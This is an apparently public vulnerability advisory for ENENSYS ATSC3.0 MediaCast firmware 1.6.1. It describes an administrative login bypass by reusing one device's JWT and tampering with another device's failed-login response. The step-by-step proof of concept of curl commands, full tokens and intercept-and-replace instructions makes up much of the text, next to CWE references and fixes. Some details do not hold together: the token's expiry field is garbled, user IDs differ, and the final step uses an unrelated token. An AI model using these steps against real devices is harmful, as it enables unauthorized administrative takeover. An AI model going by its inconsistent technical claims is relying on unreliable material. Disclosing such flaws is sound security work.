# ENENSYS ATSC3.0 MediaCast – Authentication Bypass via JWT Reuse

## Description

ENENSYS **ATSC3.0 MediaCast** firmware version **1.6.1** is vulnerable to an **authentication bypass** due to improper validation of JWT tokens across devices. An attacker can intercept a valid JWT from one device and reuse it to authenticate on a different device by modifying the HTTP response of a failed login attempt — gaining **full unauthorized administrative access**.

---

## Vendor Information

- **Vendor:** ENENSYS Technologies  
- **Vendor Homepage:** [https://www.enensys.com/](https://www.enensys.com/)

---

## Affected Products

- **Product:** ENENSYS ATSC3.0 MediaCast  
- **Firmware Version:** 1.6.1

---

## Vulnerable Endpoints

- `/api/auth/login`  
- `/` (root dashboard endpoint)

---

## Attack Type

- **Type:** Authentication Bypass  
- **Classification:** Improper Authentication / Response Tampering

---

## Impact

- **Severity:** Critical  
- **Summary:**  
  - JWT tokens from one device can be reused on other unrelated devices.  
  - Client-side tampering of server responses allows bypassing authentication.  
  - Admin access can be obtained across multiple devices using a single valid JWT.

---

## Affected Components

- **Session Management:** JWT tokens accepted across unrelated devices.  
- **Authentication Flow:** No proper verification of JWT audience or issuer.  
- **HTTP Response Validation:** Client-side manipulation allows bypassing login validation.

---

## Attack Vectors

- **Access Method:** Remote (via network access to at least one device)  
- **Authentication Requirement:** Valid login on any one device  
- **Exploit Complexity:** Medium (requires HTTP interception and modification)

---

## Proof of Concept (PoC)

### 1. Scenario Overview

**Device 1 (Attacker-owned)**  
- IP: `137.18.2.1`  
- Username: `admin`  
- Password: `passd1`

**Device 2 (Target device)**  
- IP: `208.129.3.4`  
- Username: `admin`  
- Password: `pworld2`

---

### 2. Exploit Steps

#### ✅ Step 1: Obtain JWT from Device 1

```bash
curl -X POST 'http://137.18.2.1/api/auth/login' \
  -H 'Content-Type: application/json' \
  --data-raw '{"username":"admin","password":"passd1"}'
```
#### Example Response:
```json
{"user":{"Id":"0503b6fa-57f5-52d4-bda6-d9ee32cdedd4","Login":"admin","Name":"Administrator","Email":"support@enensys.fr","Roles":[{"Name":"Administrator","Permissions":[]}],"Description":"Application administrator","Location":"FRANCE","Banned":false,"Active":true,"IsAdmin":true,"Authentication":"local","LastConnection":2851199455},"token":"eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXUyJ9.eyJzdWIiOnsiaWQiOiIwMzAzYjZmYS01N2Y1LTQyZDQtYmRhNS1kOWVlMzJjZGVkZDMiLCJyb2xlcyI6W3siSWQiOiI0ZWNiMWExMC1hYWU3LTQ4NDMtOWUwNC1hMmRlODRiNjBjZGIiLCJOYW1lIjoiQWRtaW5pc3RyYXRvciIsIkRlc2NyaXB0aW9uIjoiVGhlIGFkbWluaXN0cmF0b3Igcm9sZSBoYXMgZnVsbCByaWdodHMuIiwiSXNBZG1pbiI6dHJ1ZX1dfSwiaXNzIjoicmVzdC1pbnRlcmZhY2UiLCJpYXQiOjE3NDMxOTk1MzksImV4cCI6MTc4ZzI4Mjcz6X0.lHQNAl-Sb7u_WJp9t5gKOcyvi8W_NX-7e-EGaOV_t10aPF7qcCdINSu2dFCJvppX4JdYHizfEFIPyABVoZJzmmgvigYDaUZyAojECfQ7x7F6EHRp71qQ5IGxUhRAxfxZuFpo2l1KgXjyJ2wpwFA0FA8Ruf0W9zcAntpJVBqL-2M4Pahfn3zas4qgzNbBl7zrMfC3nx4RJs9tt4vUEr-JuH8sns1CNqr_VQBdMnEXfwmqQVkWSn-xGGJAj-OK9zgmJPy9emjg-ZlBcGWBrOewNV53dOFbh9xr7QItj2QrQfraRsvMLTsMD5RMq9A1n16GGzNZ2Mo274TN2t40qrv-bqOY98B8yB4tmPC0kGpw2eH1HbpRcFqUzXAAHu69q-89gKrtcncE3c6adjWRvIQIdBotjAhy0Ub_LrIH2742oNdrc7ef-6YNKVNJFQksGGZL1kazPVcPojh4W0CrhGAHHCDr7138y7v3NcJ9PXKQ1CsoYNacH0gkeBpFpdXj9vKyOxLXc1JTxlN0isuSVFHeTGRxQ027L99todsdPwIt5Sqpa05A5T-vaojx5UOGO2EXTcLn5NSiU1PtyvcSxVTecWkhsXq45jsv6ZF2gQkApONAp8IweK2eqkFfaHthy5GOSn_9hzS_BBmxilL0z-gukyLDPNq9nL0duklwbzummqs","refreshToken":"eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXUyJ9.eyJzdWIiOnsiaWQiOiIwMzAzYjZmYS01N2Y1LTQyZDQtYmRhNS1kOWVlMzJjZGVkZDMiLCJyb2xlcyI6W3siSWQiOiI0ZWNiMWExMC1hYWU3LTQ4NDMtOWUwNC1hMmRlODRiNjBjZGIiLCJOYW1lIjoiQWRtaW5pc3RyYXRvciIsIkRlc2NyaXB0aW9uIjoiVGhlIGFkbWluaXN0cmF0b3Igcm9sZSBoYXMgZnVsbCByaWdodHMuIiwiSXNBZG1pbiI6dHJ1ZX1dfSwiaXNzIjoicmVzdC1pbnRlcmZhY2UiLCJpYXQiOjE3NDMxOTk1MzksImV4cCI6MTc0MzIwMzEzOX0.IoiPNallJ21fm4Q1ZGXTJtgvez4X1MbsDpExXpXCvUy0tHtj04-Uq3AIgrylmrYDaUi3bOqru3es-NGrkekLdyxDsWgElvPeIs1cyUsUx8UO2AnMOchr8DShedb0WIX80qAK94LQaW8Pl543KLehR_j0donY9pE1fHKwIi1sN9VL_JQoVtBZ2pKAMU9nf6nWBxnkvBXXQPIoEJKFkyai4dIlvSEXuEFNqiOyAJtgkLqXVA5YCWMuv7tMKTsBIhU0BffVl04HR4WWQr6-X7Pj4CB2AvdBhLplDaZnAreVaTgVjEVQx0YMXKyYvDA29cIx1zsl8r_NQJNCP7kNcKAQrUVba5vc0ptK_V2bRE-wZ7oWhycoQb_5iWf0WTDR8VAPENrbCGyX8Q3F08ZJVNZ2ER3m8ixDQXBxAOJxzADfcVTP4TWukd4ZTsVKoMQqw0WhD69gfqq0A97KWQ9rOYM01-nndUmhoq49xhvnYlMGdxsAfc-VceNrRgI3n_BQqCOMNqTfD_VOPV-7I3lRkc3dv6TVTvgsURHoi7KE0TTqkzfXGHI36SEy0FW36o4LoQvUI9ECrETUctBQpWvQgoLLoCxjgLHC_vERjyOiO4xYDRS4KvC5duF0Ks-vGX6JfsBxfjx4-VwDHD6zvk5eenZDFELbL1wpA2_fz2aTSt_pgO5"}
```
Save the Response value for later reuse.

####  ✅ Step 2: Attempt Login on Device 2 with Invalid Credentials
```bash
curl -X POST 'http://208.129.3.4/api/auth/login' \
  -H 'Content-Type: application/json' \
  --data-raw '{"username":"admin","password":"wrongpass"}'
```
#### Expected Response:
```json
{
  "error": "Unauthorized"
}
```

#### ✅ Step 3: Intercept and Modify the Response
 Using tools like **Burp Suite** or **Mitmproxy**:
  * Change the **HTTP status code**: `401 Unauthorized` → `200 OK` 
  * Replace the **body** with the JWT from Device 1:
  ```json
{"user":{"Id":"0503b6fa-57f5-52d4-bda6-d9ee32cdedd4","Login":"admin","Name":"Administrator","Email":"support@enensys.fr","Roles":[{"Name":"Administrator","Permissions":[]}],"Description":"Application administrator","Location":"FRANCE","Banned":false,"Active":true,"IsAdmin":true,"Authentication":"local","LastConnection":2851199455},"token":"eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXUyJ9.eyJzdWIiOnsiaWQiOiIwMzAzYjZmYS01N2Y1LTQyZDQtYmRhNS1kOWVlMzJjZGVkZDMiLCJyb2xlcyI6W3siSWQiOiI0ZWNiMWExMC1hYWU3LTQ4NDMtOWUwNC1hMmRlODRiNjBjZGIiLCJOYW1lIjoiQWRtaW5pc3RyYXRvciIsIkRlc2NyaXB0aW9uIjoiVGhlIGFkbWluaXN0cmF0b3Igcm9sZSBoYXMgZnVsbCByaWdodHMuIiwiSXNBZG1pbiI6dHJ1ZX1dfSwiaXNzIjoicmVzdC1pbnRlcmZhY2UiLCJpYXQiOjE3NDMxOTk1MzksImV4cCI6MTc4ZzI4Mjcz6X0.lHQNAl-Sb7u_WJp9t5gKOcyvi8W_NX-7e-EGaOV_t10aPF7qcCdINSu2dFCJvppX4JdYHizfEFIPyABVoZJzmmgvigYDaUZyAojECfQ7x7F6EHRp71qQ5IGxUhRAxfxZuFpo2l1KgXjyJ2wpwFA0FA8Ruf0W9zcAntpJVBqL-2M4Pahfn3zas4qgzNbBl7zrMfC3nx4RJs9tt4vUEr-JuH8sns1CNqr_VQBdMnEXfwmqQVkWSn-xGGJAj-OK9zgmJPy9emjg-ZlBcGWBrOewNV53dOFbh9xr7QItj2QrQfraRsvMLTsMD5RMq9A1n16GGzNZ2Mo274TN2t40qrv-bqOY98B8yB4tmPC0kGpw2eH1HbpRcFqUzXAAHu69q-89gKrtcncE3c6adjWRvIQIdBotjAhy0Ub_LrIH2742oNdrc7ef-6YNKVNJFQksGGZL1kazPVcPojh4W0CrhGAHHCDr7138y7v3NcJ9PXKQ1CsoYNacH0gkeBpFpdXj9vKyOxLXc1JTxlN0isuSVFHeTGRxQ027L99todsdPwIt5Sqpa05A5T-vaojx5UOGO2EXTcLn5NSiU1PtyvcSxVTecWkhsXq45jsv6ZF2gQkApONAp8IweK2eqkFfaHthy5GOSn_9hzS_BBmxilL0z-gukyLDPNq9nL0duklwbzummqs","refreshToken":"eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXUyJ9.eyJzdWIiOnsiaWQiOiIwMzAzYjZmYS01N2Y1LTQyZDQtYmRhNS1kOWVlMzJjZGVkZDMiLCJyb2xlcyI6W3siSWQiOiI0ZWNiMWExMC1hYWU3LTQ4NDMtOWUwNC1hMmRlODRiNjBjZGIiLCJOYW1lIjoiQWRtaW5pc3RyYXRvciIsIkRlc2NyaXB0aW9uIjoiVGhlIGFkbWluaXN0cmF0b3Igcm9sZSBoYXMgZnVsbCByaWdodHMuIiwiSXNBZG1pbiI6dHJ1ZX1dfSwiaXNzIjoicmVzdC1pbnRlcmZhY2UiLCJpYXQiOjE3NDMxOTk1MzksImV4cCI6MTc0MzIwMzEzOX0.IoiPNallJ21fm4Q1ZGXTJtgvez4X1MbsDpExXpXCvUy0tHtj04-Uq3AIgrylmrYDaUi3bOqru3es-NGrkekLdyxDsWgElvPeIs1cyUsUx8UO2AnMOchr8DShedb0WIX80qAK94LQaW8Pl543KLehR_j0donY9pE1fHKwIi1sN9VL_JQoVtBZ2pKAMU9nf6nWBxnkvBXXQPIoEJKFkyai4dIlvSEXuEFNqiOyAJtgkLqXVA5YCWMuv7tMKTsBIhU0BffVl04HR4WWQr6-X7Pj4CB2AvdBhLplDaZnAreVaTgVjEVQx0YMXKyYvDA29cIx1zsl8r_NQJNCP7kNcKAQrUVba5vc0ptK_V2bRE-wZ7oWhycoQb_5iWf0WTDR8VAPENrbCGyX8Q3F08ZJVNZ2ER3m8ixDQXBxAOJxzADfcVTP4TWukd4ZTsVKoMQqw0WhD69gfqq0A97KWQ9rOYM01-nndUmhoq49xhvnYlMGdxsAfc-VceNrRgI3n_BQqCOMNqTfD_VOPV-7I3lRkc3dv6TVTvgsURHoi7KE0TTqkzfXGHI36SEy0FW36o4LoQvUI9ECrETUctBQpWvQgoLLoCxjgLHC_vERjyOiO4xYDRS4KvC5duF0Ks-vGX6JfsBxfjx4-VwDHD6zvk5eenZDFELbL1wpA2_fz2aTSt_pgO5"}
```
#### ✅ Step 4: Refresh the Browser or API Client
 The device now treats the session as authenticated. 
* * * 
#### ✅ Step 5: Confirm Admin Access
```bash 
curl -X GET 'http://208.129.3.4/api/admin' \
  -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...'
```
**Example Output:**
```json
{
  "status": "authenticated",
  "user": "admin"
}
```
---

## **PoC Video**  

https://github.com/user-attachments/assets/d45ae9b0-7f64-446a-9579-dccdfb1aa7d6

---

## Vulnerability Details

### 📌 Vulnerability Type

**Authentication Bypass via JWT Reuse and HTTP Response Manipulation**

---

### 🧩 CWE Identifiers

- **CWE-287** – Improper Authentication  
- **CWE-345** – Insufficient Verification of Data Authenticity  
- **CWE-384** – Session Fixation

---

### 🚨 Impact Types

- **Account Takeover**  
- **Privilege Escalation**  
- **Remote Unauthorized Access**  
- **Configuration Manipulation**

---

## ✅ Suggested Fixes

- Bind JWT tokens to the originating device or IP address.  
- Validate the `aud` (Audience) and `iss` (Issuer) claims in JWTs.  
- Invalidate tokens upon login attempts from unfamiliar sources.  
- Enforce server-side authentication validation — avoid relying on client-side response handling.  
- Prevent clients from modifying HTTP response codes or payloads.

---

## 🛡️ Mitigation & Workarounds

- Implement strong API-level validation of JWT issuer and expiration.  
- Monitor for reuse of JWTs across different IPs or devices.  
- Apply Web Application Firewall (WAF) rules to detect and block abnormal login behavior.
